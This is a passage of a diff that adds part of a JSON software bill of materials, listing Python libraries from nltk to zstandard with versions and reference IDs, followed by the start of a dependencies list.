+      "name": "nltk",
+      "type": "library",
+      "version": "3.9.4"
+    },
+    {
+      "bom-ref": "BomRef.3261519405105291.05813510863812554",
+      "name": "notebook_shim",
+      "type": "library",
+      "version": "0.2.4"
+    },
+    {
+      "bom-ref": "BomRef.5870154983257475.4458431452651074",
+      "name": "numpy",
+      "type": "library",
+      "version": "2.4.6"
+    },
+    {
+      "bom-ref": "BomRef.46182372469935584.5520431902240848",
+      "name": "nvdlib",
+      "type": "library",
+      "version": "0.8.3"
+    },
+    {
+      "bom-ref": "BomRef.7987973079472684.05823186279484727",
+      "name": "nvidia-riva-client",
+      "type": "library",
+      "version": "2.16.0"
+    },
+    {
+      "bom-ref": "BomRef.25292782141063175.6153503372301186",
+      "name": "ollama",
+      "type": "library",
+      "version": "0.6.2"
+    },
+    {
+      "bom-ref": "BomRef.717121616276723.8602783180693614",
+      "name": "openai",
+      "type": "library",
+      "version": "2.38.0"
+    },
+    {
+      "bom-ref": "BomRef.587176482416859.6197632466075353",
+      "name": "opentelemetry-api",
+      "type": "library",
+      "version": "1.42.1"
+    },
+    {
+      "bom-ref": "BomRef.6104714485247621.9835494485676799",
+      "name": "opentelemetry-exporter-otlp-proto-common",
+      "type": "library",
+      "version": "1.42.1"
+    },
+    {
+      "bom-ref": "BomRef.02354572132245092.5753812390571666",
+      "name": "opentelemetry-exporter-otlp-proto-grpc",
+      "type": "library",
+      "version": "1.42.1"
+    },
+    {
+      "bom-ref": "BomRef.38487635044843294.292295619126386",
+      "name": "opentelemetry-proto",
+      "type": "library",
+      "version": "1.42.1"
+    },
+    {
+      "bom-ref": "BomRef.5691997507207436.830880580069127",
+      "name": "opentelemetry-sdk",
+      "type": "library",
+      "version": "1.42.1"
+    },
+    {
+      "bom-ref": "BomRef.9728830510655153.924651012868287",
+      "name": "opentelemetry-semantic-conventions",
+      "type": "library",
+      "version": "0.63b1"
+    },
+    {
+      "bom-ref": "BomRef.7350331000158663.3878176656168951",
+      "name": "orjson",
+      "type": "library",
+      "version": "3.11.9"
+    },
+    {
+      "bom-ref": "BomRef.9797278520533581.402195191813713",
+      "name": "ormsgpack",
+      "type": "library",
+      "version": "1.12.2"
+    },
+    {
+      "bom-ref": "BomRef.49748902082894675.42820375008502654",
+      "name": "packageurl-python",
+      "type": "library",
+      "version": "0.17.6"
+    },
+    {
+      "bom-ref": "BomRef.08973940682579495.5013426848565821",
+      "name": "packaging",
+      "type": "library",
+      "version": "25.0"
+    },
+    {
+      "bom-ref": "BomRef.39145783708191273.9408091450511974",
+      "name": "pandas",
+      "type": "library",
+      "version": "3.0.3"
+    },
+    {
+      "bom-ref": "BomRef.9300661194791731.48500666423299954",
+      "name": "pandocfilters",
+      "type": "library",
+      "version": "1.5.1"
+    },
+    {
+      "bom-ref": "BomRef.1552349967152219.501083430468671",
+      "name": "parso",
+      "type": "library",
+      "version": "0.8.7"
+    },
+    {
+      "bom-ref": "BomRef.6465151282523582.9330649332047797",
+      "name": "pexpect",
+      "type": "library",
+      "version": "4.9.0"
+    },
+    {
+      "bom-ref": "BomRef.7582811194440576.410090447001055",
+      "name": "phonenumbers",
+      "type": "library",
+      "version": "9.0.31"
+    },
+    {
+      "bom-ref": "BomRef.9135279342794274.1355577781786823",
+      "name": "pillow",
+      "type": "library",
+      "version": "12.2.0"
+    },
+    {
+      "bom-ref": "BomRef.5556184671098441.14923768708012064",
+      "name": "pip",
+      "type": "library",
+      "version": "25.2"
+    },
+    {
+      "bom-ref": "BomRef.9917435452359389.36329273715532506",
+      "name": "pip-api",
+      "type": "library",
+      "version": "0.0.34"
+    },
+    {
+      "bom-ref": "BomRef.4230937911038558.5074007631133205",
+      "name": "pip-requirements-parser",
+      "type": "library",
+      "version": "32.0.1"
+    },
+    {
+      "bom-ref": "BomRef.8744064817273383.8742671724991278",
+      "name": "pip_audit",
+      "type": "library",
+      "version": "2.10.0"
+    },
+    {
+      "bom-ref": "BomRef.7629190855858623.3374261976428127",
+      "name": "platformdirs",
+      "type": "library",
+      "version": "4.3.8"
+    },
+    {
+      "bom-ref": "BomRef.2696672733350667.7661934265947816",
+      "name": "pluggy",
+      "type": "library",
+      "version": "1.6.0"
+    },
+    {
+      "bom-ref": "BomRef.29481628186263464.8461984843789991",
+      "name": "portalocker",
+      "type": "library",
+      "version": "3.2.0"
+    },
+    {
+      "bom-ref": "BomRef.2592422310678406.2580190772266703",
+      "name": "posthog",
+      "type": "library",
+      "version": "3.25.0"
+    },
+    {
+      "bom-ref": "BomRef.9576441353919534.5123564319878948",
+      "name": "preshed",
+      "type": "library",
+      "version": "3.0.13"
+    },
+    {
+      "bom-ref": "BomRef.6030781796244208.46138985146610656",
+      "name": "presidio",
+      "type": "library",
+      "version": "2.2.362"
+    },
+    {
+      "bom-ref": "BomRef.7676392611300372.7488252955102862",
+      "name": "presidio_analyzer",
+      "type": "library",
+      "version": "2.2.362"
+    },
+    {
+      "bom-ref": "BomRef.3149573137125017.24501067686993283",
+      "name": "presidio_anonymizer",
+      "type": "library",
+      "version": "2.2.362"
+    },
+    {
+      "bom-ref": "BomRef.9047274773231516.5461310582531346",
+      "name": "prometheus_client",
+      "type": "library",
+      "version": "0.25.0"
+    },
+    {
+      "bom-ref": "BomRef.6343716890864213.5998587305397035",
+      "name": "prompt_toolkit",
+      "type": "library",
+      "version": "3.0.52"
+    },
+    {
+      "bom-ref": "BomRef.6225752196998329.8517922922544766",
+      "name": "propcache",
+      "type": "library",
+      "version": "0.5.2"
+    },
+    {
+      "bom-ref": "BomRef.5142567998301483.3544682097061016",
+      "name": "proto-plus",
+      "type": "library",
+      "version": "1.28.0"
+    },
+    {
+      "bom-ref": "BomRef.24840603000491124.7082078036919259",
+      "name": "protobuf",
+      "type": "library",
+      "version": "6.33.6"
+    },
+    {
+      "bom-ref": "BomRef.9195193586321107.5141346347272304",
+      "name": "psutil",
+      "type": "library",
+      "version": "7.2.2"
+    },
+    {
+      "bom-ref": "BomRef.6514012459337926.5984854196141284",
+      "name": "ptyprocess",
+      "type": "library",
+      "version": "0.7.0"
+    },
+    {
+      "bom-ref": "BomRef.599478257838803.7049706755714126",
+      "name": "publicsuffix2",
+      "type": "library",
+      "version": "2.20191221"
+    },
+    {
+      "bom-ref": "BomRef.1232534426868862.9193396836575126",
+      "name": "pure_eval",
+      "type": "library",
+      "version": "0.2.3"
+    },
+    {
+      "bom-ref": "BomRef.6122101284362443.8056980729182535",
+      "name": "py-markdown-table",
+      "type": "library",
+      "version": "1.3.0"
+    },
+    {
+      "bom-ref": "BomRef.2658651432261139.8288997428011535",
+      "name": "py-serializable",
+      "type": "library",
+      "version": "2.1.0"
+    },
+    {
+      "bom-ref": "BomRef.9369312204481453.5384321565195109",
+      "name": "pyOpenSSL",
+      "type": "library",
+      "version": "26.2.0"
+    },
+    {
+      "bom-ref": "BomRef.28182012607901297.9572384284922795",
+      "name": "pyarrow",
+      "type": "library",
+      "version": "24.0.0"
+    },
+    {
+      "bom-ref": "BomRef.38595912296529555.07253599178437298",
+      "name": "pyasn1",
+      "type": "library",
+      "version": "0.6.3"
+    },
+    {
+      "bom-ref": "BomRef.22673706122354997.7483964151938735",
+      "name": "pyasn1_modules",
+      "type": "library",
+      "version": "0.4.2"
+    },
+    {
+      "bom-ref": "BomRef.39138665252898963.1250823660138335",
+      "name": "pycosat",
+      "type": "library",
+      "version": "0.6.6"
+    },
+    {
+      "bom-ref": "BomRef.35632286890168474.3723756897832252",
+      "name": "pycparser",
+      "type": "library",
+      "version": "2.22"
+    },
+    {
+      "bom-ref": "BomRef.6922159754949192.9047965879331773",
+      "name": "pydantic",
+      "type": "library",
+      "version": "2.13.4"
+    },
+    {
+      "bom-ref": "BomRef.858810609902812.37266614152332755",
+      "name": "pydantic-settings",
+      "type": "library",
+      "version": "2.14.1"
+    },
+    {
+      "bom-ref": "BomRef.31652707546995296.2180802241129044",
+      "name": "pydantic_core",
+      "type": "library",
+      "version": "2.46.4"
+    },
+    {
+      "bom-ref": "BomRef.019082170549975297.9291389777076323",
+      "name": "pylsqpack",
+      "type": "library",
+      "version": "0.3.24"
+    },
+    {
+      "bom-ref": "BomRef.5659424187059464.4928730766530436",
+      "name": "pyparsing",
+      "type": "library",
+      "version": "3.3.2"
+    },
+    {
+      "bom-ref": "BomRef.022410191733870932.01960440319848189",
+      "name": "pyperclip",
+      "type": "library",
+      "version": "1.11.0"
+    },
+    {
+      "bom-ref": "BomRef.28059874351196745.767159206900313",
+      "name": "pyrsistent",
+      "type": "library",
+      "version": "0.20.0"
+    },
+    {
+      "bom-ref": "BomRef.6201848029673364.9101133071931095",
+      "name": "pytest",
+      "type": "library",
+      "version": "9.0.3"
+    },
+    {
+      "bom-ref": "BomRef.664570149020911.03753545723489771",
+      "name": "pytest-asyncio",
+      "type": "library",
+      "version": "1.4.0"
+    },
+    {
+      "bom-ref": "BomRef.4510784328091032.2207737467880917",
+      "name": "pytest-repeat",
+      "type": "library",
+      "version": "0.9.4"
+    },
+    {
+      "bom-ref": "BomRef.4345060661378718.8381296819312538",
+      "name": "pytest-rerunfailures",
+      "type": "library",
+      "version": "12.0"
+    },
+    {
+      "bom-ref": "BomRef.7188153951979083.4174678594274315",
+      "name": "pytest-xdist",
+      "type": "library",
+      "version": "3.8.0"
+    },
+    {
+      "bom-ref": "BomRef.6228883299066237.9047889273850208",
+      "name": "python-dateutil",
+      "type": "library",
+      "version": "2.9.0.post0"
+    },
+    {
+      "bom-ref": "BomRef.45023341373442616.23894122518406502",
+      "name": "python-dotenv",
+      "type": "library",
+      "version": "1.2.2"
+    },
+    {
+      "bom-ref": "BomRef.39283480552174765.5800088396858379",
+      "name": "python-engineio",
+      "type": "library",
+      "version": "4.13.2"
+    },
+    {
+      "bom-ref": "BomRef.9160168926916056.39201837509347437",
+      "name": "python-json-logger",
+      "type": "library",
+      "version": "4.1.0"
+    },
+    {
+      "bom-ref": "BomRef.7228119789404.3665090678819626",
+      "name": "python-magic",
+      "type": "library",
+      "version": "0.4.27"
+    },
+    {
+      "bom-ref": "BomRef.633450270441953.5867116596075429",
+      "name": "python-socketio",
+      "type": "library",
+      "version": "5.16.2"
+    },
+    {
+      "bom-ref": "BomRef.251140291695769.3287300805063993",
+      "name": "pytz",
+      "type": "library",
+      "version": "2026.2"
+    },
+    {
+      "bom-ref": "BomRef.6262703656466881.6033802627576683",
+      "name": "pyzmq",
+      "type": "library",
+      "version": "27.1.0"
+    },
+    {
+      "bom-ref": "BomRef.5810476887023769.930196477753474",
+      "name": "ragas",
+      "type": "library",
+      "version": "0.3.2"
+    },
+    {
+      "bom-ref": "BomRef.8354901972557974.16502068084101773",
+      "name": "referencing",
+      "type": "library",
+      "version": "0.37.0"
+    },
+    {
+      "bom-ref": "BomRef.6071560231727254.16213957651931554",
+      "name": "regex",
+      "type": "library",
+      "version": "2026.5.9"
+    },
+    {
+      "bom-ref": "BomRef.8130066318778998.9345639763146445",
+      "name": "replicate",
+      "type": "library",
+      "version": "1.0.7"
+    },
+    {
+      "bom-ref": "BomRef.2191743996958927.1668452679671487",
+      "name": "requests",
+      "type": "library",
+      "version": "2.34.2"
+    },
+    {
+      "bom-ref": "BomRef.38496166801645504.2927582408668672",
+      "name": "requests-file",
+      "type": "library",
+      "version": "3.0.1"
+    },
+    {
+      "bom-ref": "BomRef.9922659683423632.03036274813251061",
+      "name": "requests-toolbelt",
+      "type": "library",
+      "version": "1.0.0"
+    },
+    {
+      "bom-ref": "BomRef.7575177082952373.29994538569840956",
+      "name": "rfc3339-validator",
+      "type": "library",
+      "version": "0.1.4"
+    },
+    {
+      "bom-ref": "BomRef.5426084335681873.9841720175440686",
+      "name": "rfc3986-validator",
+      "type": "library",
+      "version": "0.1.1"
+    },
+    {
+      "bom-ref": "BomRef.7694253682450548.8848235691141807",
+      "name": "rfc3987-syntax",
+      "type": "library",
+      "version": "1.1.0"
+    },
+    {
+      "bom-ref": "BomRef.34875848110163954.6409500569198558",
+      "name": "rich",
+      "type": "library",
+      "version": "13.9.4"
+    },
+    {
+      "bom-ref": "BomRef.7637256031451053.24061171842307005",
+      "name": "rpds-py",
+      "type": "library",
+      "version": "2026.5.1"
+    },
+    {
+      "bom-ref": "BomRef.1860848757539184.4650379383263302",
+      "name": "ruamel.yaml",
+      "type": "library",
+      "version": "0.18.14"
+    },
+    {
+      "bom-ref": "BomRef.4681639498418452.05206518358094325",
+      "name": "ruamel.yaml.clib",
+      "type": "library",
+      "version": "0.2.8"
+    },
+    {
+      "bom-ref": "BomRef.9890937650424876.7121058424320219",
+      "name": "s3transfer",
+      "type": "library",
+      "version": "0.18.0"
+    },
+    {
+      "bom-ref": "BomRef.33330575119122685.5014855341739134",
+      "name": "safetensors",
+      "type": "library",
+      "version": "0.7.0"
+    },
+    {
+      "bom-ref": "BomRef.6586321340847697.1976276883252137",
+      "name": "sentencepiece",
+      "type": "library",
+      "version": "0.2.1"
+    },
+    {
+      "bom-ref": "BomRef.25429108306809733.8003799382683796",
+      "name": "sentry-sdk",
+      "type": "library",
+      "version": "2.61.0"
+    },
+    {
+      "bom-ref": "BomRef.704088093764095.7760909779616184",
+      "name": "service-identity",
+      "type": "library",
+      "version": "24.2.0"
+    },
+    {
+      "bom-ref": "BomRef.26506605804104766.13246688449240374",
+      "name": "setuptools",
+      "type": "library",
+      "version": "80.9.0"
+    },
+    {
+      "bom-ref": "BomRef.6041111199964307.02752392159122241",
+      "name": "shellingham",
+      "type": "library",
+      "version": "1.5.4"
+    },
+    {
+      "bom-ref": "BomRef.1141172225962307.24400437958411825",
+      "name": "simple-websocket",
+      "type": "library",
+      "version": "1.1.0"
+    },
+    {
+      "bom-ref": "BomRef.022409294773899635.7382151611756191",
+      "name": "six",
+      "type": "library",
+      "version": "1.17.0"
+    },
+    {
+      "bom-ref": "BomRef.5375461063470047.011970853991172481",
+      "name": "smart_open",
+      "type": "library",
+      "version": "7.6.1"
+    },
+    {
+      "bom-ref": "BomRef.528456616792141.9954702253936597",
+      "name": "smmap",
+      "type": "library",
+      "version": "5.0.3"
+    },
+    {
+      "bom-ref": "BomRef.7629692384863784.11326617643385506",
+      "name": "sniffio",
+      "type": "library",
+      "version": "1.3.1"
+    },
+    {
+      "bom-ref": "BomRef.5458530992001009.863285727134259",
+      "name": "sortedcontainers",
+      "type": "library",
+      "version": "2.4.0"
+    },
+    {
+      "bom-ref": "BomRef.7538445110049198.7342245678027031",
+      "name": "soupsieve",
+      "type": "library",
+      "version": "2.8.4"
+    },
+    {
+      "bom-ref": "BomRef.10434496961439865.2631399000020477",
+      "name": "spacy",
+      "type": "library",
+      "version": "3.8.14"
+    },
+    {
+      "bom-ref": "BomRef.359711650765994.5257775042454039",
+      "name": "spacy-legacy",
+      "type": "library",
+      "version": "3.0.12"
+    },
+    {
+      "bom-ref": "BomRef.32990302167500396.5578222877852405",
+      "name": "spacy-loggers",
+      "type": "library",
+      "version": "1.0.5"
+    },
+    {
+      "bom-ref": "BomRef.1603404326211899.5210962032427249",
+      "name": "srsly",
+      "type": "library",
+      "version": "2.5.3"
+    },
+    {
+      "bom-ref": "BomRef.4474530248011891.8769338830416918",
+      "name": "stack-data",
+      "type": "library",
+      "version": "0.6.3"
+    },
+    {
+      "bom-ref": "BomRef.6836995366901549.01878505088619442",
+      "name": "stdlibs",
+      "type": "library",
+      "version": "2026.2.26"
+    },
+    {
+      "bom-ref": "BomRef.6281419308705509.8542907574234969",
+      "name": "sympy",
+      "type": "library",
+      "version": "1.14.0"
+    },
+    {
+      "bom-ref": "BomRef.6112486003114409.32761270245788865",
+      "name": "tabulate",
+      "type": "library",
+      "version": "0.9.0"
+    },
+    {
+      "bom-ref": "BomRef.26158997905341086.37259311120936733",
+      "name": "tenacity",
+      "type": "library",
+      "version": "9.0.0"
+    },
+    {
+      "bom-ref": "BomRef.5381095263485293.5129437826677646",
+      "name": "termcolor",
+      "type": "library",
+      "version": "3.3.0"
+    },
+    {
+      "bom-ref": "BomRef.3340603481168395.48319102400797576",
+      "name": "terminado",
+      "type": "library",
+      "version": "0.18.1"
+    },
+    {
+      "bom-ref": "BomRef.0789074045763557.7444434593473682",
+      "name": "textual",
+      "type": "library",
+      "version": "8.2.7"
+    },
+    {
+      "bom-ref": "BomRef.4976318080328097.5611758437457336",
+      "name": "thinc",
+      "type": "library",
+      "version": "8.3.13"
+    },
+    {
+      "bom-ref": "BomRef.8735383760668686.004137548580503969",
+      "name": "tiktoken",
+      "type": "library",
+      "version": "0.13.0"
+    },
+    {
+      "bom-ref": "BomRef.6622978047435109.1305648228646048",
+      "name": "tinycss2",
+      "type": "library",
+      "version": "1.5.1"
+    },
+    {
+      "bom-ref": "BomRef.1393266863984678.9872355150873365",
+      "name": "tldextract",
+      "type": "library",
+      "version": "5.3.1"
+    },
+    {
+      "bom-ref": "BomRef.6814782059028809.7898460463459825",
+      "name": "tokenizers",
+      "type": "library",
+      "version": "0.22.2"
+    },
+    {
+      "bom-ref": "BomRef.08966798540877374.2137200042910301",
+      "name": "tomli",
+      "type": "library",
+      "version": "2.4.1"
+    },
+    {
+      "bom-ref": "BomRef.07542359636787832.5891975123129473",
+      "name": "tomli_w",
+      "type": "library",
+      "version": "1.2.0"
+    },
+    {
+      "bom-ref": "BomRef.7147577495141438.17258040718472722",
+      "name": "tornado",
+      "type": "library",
+      "version": "6.5.5"
+    },
+    {
+      "bom-ref": "BomRef.3729869130040807.4780404198148174",
+      "name": "tqdm",
+      "type": "library",
+      "version": "4.67.1"
+    },
+    {
+      "bom-ref": "BomRef.26253072069777084.40429761881259396",
+      "name": "traitlets",
+      "type": "library",
+      "version": "5.14.3"
+    },
+    {
+      "bom-ref": "BomRef.7745454547570858.9355394866192387",
+      "name": "transformers",
+      "type": "library",
+      "version": "5.9.0"
+    },
+    {
+      "bom-ref": "BomRef.18258179730968338.999673540179026",
+      "name": "truststore",
+      "type": "library",
+      "version": "0.10.3"
+    },
+    {
+      "bom-ref": "BomRef.1595444477425796.8223726610599607",
+      "name": "typeguard",
+      "type": "library",
+      "version": "4.4.3"
+    },
+    {
+      "bom-ref": "BomRef.23067824671089676.07706046656727916",
+      "name": "typer",
+      "type": "library",
+      "version": "0.25.1"
+    },
+    {
+      "bom-ref": "BomRef.472528642211404.5483357250985846",
+      "name": "types-requests",
+      "type": "library",
+      "version": "2.33.0.20260518"
+    },
+    {
+      "bom-ref": "BomRef.39442141446026746.68764303378927",
+      "name": "typing-inspect",
+      "type": "library",
+      "version": "0.9.0"
+    },
+    {
+      "bom-ref": "BomRef.43371881652302346.41211326500156853",
+      "name": "typing-inspection",
+      "type": "library",
+      "version": "0.4.2"
+    },
+    {
+      "bom-ref": "BomRef.13418837852384946.12199783499009176",
+      "name": "typing_extensions",
+      "type": "library",
+      "version": "4.15.0"
+    },
+    {
+      "bom-ref": "BomRef.35315229839955664.4283520956454381",
+      "name": "tzdata",
+      "type": "library",
+      "version": "2026.2"
+    },
+    {
+      "bom-ref": "BomRef.254990149815556.5203810252662802",
+      "name": "uc-micro-py",
+      "type": "library",
+      "version": "2.0.0"
+    },
+    {
+      "bom-ref": "BomRef.8345998620946423.4112790739140211",
+      "name": "uri-template",
+      "type": "library",
+      "version": "1.3.0"
+    },
+    {
+      "bom-ref": "BomRef.3253379370482975.6359347640826057",
+      "name": "uritemplate",
+      "type": "library",
+      "version": "4.2.0"
+    },
+    {
+      "bom-ref": "BomRef.5250143275322442.22358873815678704",
+      "name": "urllib3",
+      "type": "library",
+      "version": "2.5.0"
+    },
+    {
+      "bom-ref": "BomRef.03243743178815206.5553820884367809",
+      "name": "urwid",
+      "type": "library",
+      "version": "3.0.5"
+    },
+    {
+      "bom-ref": "BomRef.7491307977598876.660670869706237",
+      "name": "uuid_utils",
+      "type": "library",
+      "version": "0.16.0"
+    },
+    {
+      "bom-ref": "BomRef.6095908630779834.9605107509983167",
+      "name": "wasabi",
+      "type": "library",
+      "version": "1.1.3"
+    },
+    {
+      "bom-ref": "BomRef.22634543286234743.49823381273247935",
+      "name": "wcwidth",
+      "type": "library",
+      "version": "0.7.0"
+    },
+    {
+      "bom-ref": "BomRef.811952505385406.4058370068436363",
+      "name": "weasel",
+      "type": "library",
+      "version": "1.0.0"
+    },
+    {
+      "bom-ref": "BomRef.9827069132322223.2439907913121271",
+      "name": "webcolors",
+      "type": "library",
+      "version": "25.10.0"
+    },
+    {
+      "bom-ref": "BomRef.937558534494412.8741801888260963",
+      "name": "webencodings",
+      "type": "library",
+      "version": "0.5.1"
+    },
+    {
+      "bom-ref": "BomRef.8313725339338087.47059667866772215",
+      "name": "websocket-client",
+      "type": "library",
+      "version": "1.9.0"
+    },
+    {
+      "bom-ref": "BomRef.5607126276326515.04608409043692829",
+      "name": "websockets",
+      "type": "library",
+      "version": "16.0"
+    },
+    {
+      "bom-ref": "BomRef.24559620673761584.33035816911358284",
+      "name": "wheel",
+      "type": "library",
+      "version": "0.45.1"
+    },
+    {
+      "bom-ref": "BomRef.1247542622160347.0976143998734289",
+      "name": "widgetsnbextension",
+      "type": "library",
+      "version": "4.0.15"
+    },
+    {
+      "bom-ref": "BomRef.9276259671241577.768504841674807",
+      "name": "wn",
+      "type": "library",
+      "version": "0.9.5"
+    },
+    {
+      "bom-ref": "BomRef.829163788215753.07828413010081292",
+      "name": "wrapt",
+      "type": "library",
+      "version": "2.2.1"
+    },
+    {
+      "bom-ref": "BomRef.5993119347901065.6663825865366596",
+      "name": "wsproto",
+      "type": "library",
+      "version": "1.3.2"
+    },
+    {
+      "bom-ref": "BomRef.046510141288874984.01857436200567686",
+      "name": "xdg-base-dirs",
+      "type": "library",
+      "version": "6.0.2"
+    },
+    {
+      "bom-ref": "BomRef.09051429877311279.34243536278646014",
+      "name": "xxhash",
+      "type": "library",
+      "version": "3.7.0"
+    },
+    {
+      "bom-ref": "BomRef.9784661808660364.4862130374944126",
+      "name": "yarl",
+      "type": "library",
+      "version": "1.24.2"
+    },
+    {
+      "bom-ref": "BomRef.8942720318260949.1646266614538655",
+      "name": "yaspin",
+      "type": "library",
+      "version": "3.4.0"
+    },
+    {
+      "bom-ref": "BomRef.9903771935616382.2822027374757755",
+      "name": "zalgolib",
+      "type": "library",
+      "version": "0.2.2"
+    },
+    {
+      "bom-ref": "BomRef.04536077794071103.3999497357469197",
+      "name": "zipp",
+      "type": "library",
+      "version": "4.1.0"
+    },
+    {
+      "bom-ref": "BomRef.5568885218356033.2465917507702714",
+      "name": "zope.event",
+      "type": "library",
+      "version": "6.2"
+    },
+    {
+      "bom-ref": "BomRef.3105500544967573.9677341414491492",
+      "name": "zope.interface",
+      "type": "library",
+      "version": "8.5"
+    },
+    {
+      "bom-ref": "BomRef.8517778503134851.2547305501360233",
+      "name": "zstandard",
+      "type": "library",
+      "version": "0.25.0"
+    }
+  ],
+  "dependencies": [
+    {
+      "ref": "BomRef.09444145998354614.6364215990415449"
+    },
+    {
+      "ref": "BomRef.9661979695235267.2509931699591792"
+    },
+    {
+      "ref": "BomRef.3615085451564528.5376319903734488"
+    },
+    {
+      "ref": "BomRef.8910781842489853.3663311440346493"
+    },
+    {
+      "ref": "BomRef.8373567868089459.6709728039086675"
+    },
+    {
+      "ref": "BomRef.24457012243570275.7647326532370963"
+    },
+    {
+      "ref": "BomRef.37506384201125376.9043465716049228"
+    },
+    {
+      "ref": "BomRef.12384946189040691.8272515220722164"
+    },
+    {
+      "ref": "BomRef.1355505135341083.6288641881886422"
+    },
+    {
+      "ref": "BomRef.5768920639441159.08447214185268304"
+    },
+    {
+      "ref": "BomRef.23212764483618487.7107080809527778"
+    },
+    {
+      "ref": "BomRef.6461190642373329.6735013764630758"
+    },
+    {
+      "ref": "BomRef.26875186246925187.8400779823824858"
+    },
+    {
+      "ref": "BomRef.5748470139881682.06155395533307084"
+    },
+    {
+      "ref": "BomRef.290238165799093.014209294475056256"
+    },
+    {
+      "ref": "BomRef.411481874808426.3828838783724693"
+    },
+    {
+      "ref": "BomRef.28767277992054563.5162198340070271"
+    },
+    {
+      "ref": "BomRef.48847732083717466.3434180386222593"
+    },
+    {
+      "ref": "BomRef.9068502138024465.28751319890462224"
+    },
+    {
+      "ref": "BomRef.7765049007520466.341992483804059"
+    },
+    {
+      "ref": "BomRef.8816560678213072.23204272929621228"
+    },
+    {
+      "ref": "BomRef.3982376358356958.047500552984714006"
+    },
+    {
+      "ref": "BomRef.1489792443303387.6420252751123592"
+    },
+    {
+      "ref": "BomRef.930874262106103.5351039699180794"
+    },
+    {
+      "ref": "BomRef.5851585329962639.14402496146256838"
+    },
+    {
+      "ref": "BomRef.21126597818036497.9096407236280888"
+    },
+    {
+      "ref": "BomRef.32166330589131575.32264405345155867"
+    },
+    {
+      "ref": "BomRef.5463111830903846.2777140088863932"
+    },
+    {
+      "ref": "BomRef.7268849862896462.4614957029128607"
+    },
+    {
+      "ref": "BomRef.17052902945555615.6130877300062175"
+    },
+    {
+      "ref": "BomRef.6984671052063214.5379121512553492"
+    },
+    {
+      "ref": "BomRef.7281311066921166.15024079974203364"
+    },
+    {
+      "ref": "BomRef.3267383709390318.10881139618096447"
+    },
+    {
+      "ref": "BomRef.3146996572887166.9303203761387282"
+    },
+    {
+      "ref": "BomRef.5790801134093788.8440681609859554"
+    },
+    {
+      "ref": "BomRef.16554542727465882.9840893785978595"
+    },
+    {
+      "ref": "BomRef.005892032658129542.8083647876418562"
+    },
+    {
+      "ref": "BomRef.5238242673047342.30957813612307195"
+    },
+    {
+      "ref": "BomRef.6540543090658728.23746395400420983"
+    },
+    {
+      "ref": "BomRef.4586423950982197.18964855935840885"
+    },
+    {
+      "ref": "BomRef.9093916872720057.3329675697949561"
+    },
+    {
+      "ref": "BomRef.6175165726390688.4770909738566187"
+    },
+    {
+      "ref": "BomRef.7048161379368484.5580506367243441"
+    },
+    {
+      "ref": "BomRef.2963572516763672.5587348414342084"
+    },
+    {
+      "ref": "BomRef.6686177303000416.18426910380583272"
+    },
+    {
+      "ref": "BomRef.003145450410379058.8487273468766864"
+    },
+    {
+      "ref": "BomRef.19732399514214738.742771406514109"
+    },
+    {
+      "ref": "BomRef.678152264465058.9265382921638989"
+    },
+    {
+      "ref": "BomRef.813117098158888.01793969465458356"
+    },
+    {
+      "ref": "BomRef.685327237228056.5220117148160999"
+    },
+    {
+      "ref": "BomRef.8593819797091637.9391088745736744"
+    },
+    {
+      "ref": "BomRef.4208667665655016.14099852906648203"
+    },
+    {
+      "ref": "BomRef.4387003491312964.25417597425390337"
+    },
+    {
+      "ref": "BomRef.3473755733169611.9001761725694478"
+    },
+    {
+      "ref": "BomRef.32723308668471973.6188196777319408"
+    },
+    {
+      "ref": "BomRef.10338634891695131.198209221434817"
+    },
+    {
+      "ref": "BomRef.9322051030240351.012746026992271897"
+    },
+    {
+      "ref": "BomRef.8702566634078012.5429620677969793"
+    },
+    {
+      "ref": "BomRef.5826240834214182.9867891345306227"
+    },
+    {
+      "ref": "BomRef.0935015732957688.07519468933018303"
+    },
+    {
+      "ref": "BomRef.15822039109672825.4502041617944813"
+    },
+    {
+      "ref": "BomRef.7916719846008354.03900218135610278"
+    },
+    {
+      "ref": "BomRef.9054813023711691.5100821032959164"
+    },
+    {
+      "ref": "BomRef.45410139898371693.9511101213305677"
+    },
+    {
+      "ref": "BomRef.6444375003332106.5330259910522174"
+    },
+    {
+      "ref": "BomRef.9838030987243598.2635616009849452"
+    },
+    {
+      "ref": "BomRef.2137071310160905.7848870076523949"
+    },
+    {
+      "ref": "BomRef.761473857096838.5721359710135467"
+    },
+    {
+      "ref": "BomRef.4572663536004936.37650963538132565"
+    },
+    {
+      "ref": "BomRef.28397036811018794.15927605048434157"
+    },
+    {
+      "ref": "BomRef.0017779829651557444.9240534020097332"
+    },
+    {
+      "ref": "BomRef.5009541823447522.34499396524627746"
+    },
+    {
+      "ref": "BomRef.5774068705650595.535163407453712"
+    },
+    {
+      "ref": "BomRef.41422304286836453.8444512115142646"
+    },
+    {
+      "ref": "BomRef.7322582641247862.5436211786693704"
+    },
+    {
+      "ref": "BomRef.8058745652980667.29519231351232966"
+    },
+    {
+      "ref": "BomRef.11246269684467414.2731131436010631"
+    },
+    {
+      "ref": "BomRef.9222667672474304.5194057883850017"
+    },
+    {
+      "ref": "BomRef.6485032474036267.9886401907117435"
+    },
+    {
+      "ref": "BomRef.4718493728332459.6599608777750945"
+    },
+    {
+      "ref": "BomRef.29166104029695217.5260973907545485"
+    },
+    {
+      "ref": "BomRef.5372835282185437.5903053429606883"
+    },
+    {
+      "ref": "BomRef.7652233465699889.033722479601582256"
+    },
+    {
+      "ref": "BomRef.18566396366302507.8051252815724302"
+    },
+    {
+      "ref": "BomRef.6228322772376608.3939631851304315"
+    },
+    {
+      "ref": "BomRef.3532301250834392.0784492646752355"
+    },
+    {
+      "ref": "BomRef.4203008889929707.8293181814291419"
+    },
+    {
+      "ref": "BomRef.09736447814300042.05253626401651612"
+    },
+    {
+      "ref": "BomRef.9343725663903345.7245170291699626"
+    },
+    {
+      "ref": "BomRef.505867576565673.6716557117953426"
+    },
+    {
+      "ref": "BomRef.9384595088489004.9686825031117673"
+    },
+    {
+      "ref": "BomRef.7452545879402975.6376656976625008"
+    },
+    {
+      "ref": "BomRef.2295193429857827.01428819284435534"
+    },
+    {
+      "ref": "BomRef.7210691142234543.4089236189505814"
+    },
+    {
+      "ref": "BomRef.11742706135811654.6858361316795386"
+    },
+    {
+      "ref": "BomRef.14246881905223296.8119393694717074"
+    },
+    {
+      "ref": "BomRef.016282255076969898.7200312167028674"
+    },
+    {
+      "ref": "BomRef.7358251255538044.5634194626659339"
+    },
+    {
+      "ref": "BomRef.3470316674495193.5139235577588205"
+    },
+    {
+      "ref": "BomRef.8170747936854401.04054620911375084"
+    },
+    {
